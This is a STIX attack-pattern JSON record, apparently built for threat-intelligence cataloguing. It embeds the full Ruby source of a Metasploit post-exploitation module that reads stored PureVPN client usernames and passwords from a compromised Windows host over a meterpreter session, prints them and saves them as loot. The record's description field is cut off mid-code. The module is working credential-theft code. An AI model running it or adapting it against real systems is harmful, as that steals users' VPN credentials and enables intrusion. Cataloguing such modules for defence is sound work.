{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7aba246c-f02c-4fb8-943a-482455e59796",
    "created": "2024-08-14T16:33:08.245464Z",
    "modified": "2024-08-14T16:33:08.245468Z",
    "name": "Windows Gather PureVPN Client Credential Collector",
    "description": " Finds the password stored for the PureVPN Client.  'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/credentials/purevpn_cred_collector.rb",
            "external_id": "purevpn_cred_collector.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2018-010/?fid=11779"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Registry\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather PureVPN Client Credential Collector',\n        'Description' => %q{\n          Finds the password stored for the PureVPN Client.\n        },\n        'References' => [\n          ['URL', 'https://www.trustwave.com/Resources/SpiderLabs-Blog/Credential-Leak-Flaws-in-Windows-PureVPN-Client/'],\n          ['URL', 'https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2018-010/?fid=11779']\n        ],\n        'License' => MSF_LICENSE,\n        'Author' => ['Manuel Nader #AgoraSecurity'],\n        'Platform' => ['win'],\n        'Arch' => [ARCH_X86, ARCH_X64],\n        'SessionTypes' => ['meterpreter'],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_ls\n              stdapi_registry_query_value_direct\n              stdapi_sys_config_getenv\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      # In case software is installed in a rare directory\n      [OptString.new('RPATH', [false, 'Path of the PureVPN Client installation'])]\n    )\n  end\n\n  def run\n    if session.type != 'meterpreter'\n      print_error('Only meterpreter sessions are supported by this post module')\n      return\n    end\n\n    locations = get_locations\n    content = get_content(locations)\n    if content && content !~ /^-1\\r\\n$/\n      get_client_creds(content)\n    else\n      print_status('No username/password found')\n    end\n  end\n\n  def get_locations\n    progfiles_env = session.sys.config.getenvs('ProgramData')\n    locations = []\n    progfiles_env.each do |_k, v|\n      vprint_status(\"Searching PureVPN Client installation at #{v}\")\n      if session.fs.dir.entries(name = v).include? 'purevpn'\n        vprint_status(\"Found PureVPN Client installation at #{v}\")\n        locations << v + '\\\\purevpn\\\\config\\\\'\n      end\n    end\n    keys = [\n      'HKLM\\\\SOFTWARE\\\\WOW6432Node\\\\OpenVPN', # 64 bit\n      # 'HKLM\\\\SOFTWARE\\\\OpenVPN' # 32 bit\n    ]\n\n    if datastore['RPATH'].nil?\n      locations << datastore['RPATH']\n    end\n\n    keys.each do |key|\n      begin\n        root_key, base_key = session.sys.registry.splitkey(key)\n        value = session.sys.registry.query_value_direct(root_key, base_key, 'config_dir')\n      rescue Rex::Post::Meterpreter::RequestError => e\n        vprint_error(e.message)\n        next\n      end\n      locations << value.data + '\\\\'\n    end\n    locations.compact.uniq!\n    return locations\n  end\n\n  def get_content(locations)\n    datfile = 'login.conf'\n    locations.each do |location|\n      vprint_status(\"Checking for login configuration at: #{location}\")\n      begin\n        files = session.fs.dir.entries(location)\n        files.map(&:downcase).uniq\n        if files.include?(datfile)\n          filepath = location + datfile\n          print_status(\"Configuration file found: #{filepath}\")\n          print_status(\"Found PureVPN login configuration on #{sysinfo['Computer']} via session ID: #{session.sid}\")\n          data = session.fs.file.open(filepath)\n          return data.read\n        end\n      rescue Rex::Post::Meterpreter::RequestError => e\n        vprint_error(e.message)\n        next\n      end\n    end\n\n    nil\n  end\n\n  def parse_file(data)\n    username, password = data.split(\"\\r\\n\")\n    creds = { 'username' => username, 'password' => password }\n    print_good('Collected the following credentials:')\n    print_good(\"    Username: #{username}\")\n    print_good(\"    Password: #{password}\")\n\n    creds\n  end\n\n  def report_cred(creds)\n    # report the goods!\n    loot_path = store_loot('PureVPN.creds', 'text/xml', session, creds.to_xml,\n                           'purevpn_credentials.xml', 'PureVPN Credentials')\n    print_status(\"PureVPN credentials saved in: #{loot_path}\")\n  end\n\n  def get_client_creds(data)\n    credentials = Rex::Text::Table.new(\n      'Header' => 'PureVPN Client Credentials',\n      'Indent' => 1,\n      'Columns' =>\n      [\n        'Username',\n        'Password'\n      ]\n    )\n    result = parse_file(data)\n    report_cred(result)\n  end\nend\n",
    "x_mitre_contributors": [
        "[Manuel Nader #AgoraSecurity]",
        ""
    ],
    "x_mitre_platforms": [
        "['win']"
    ]
}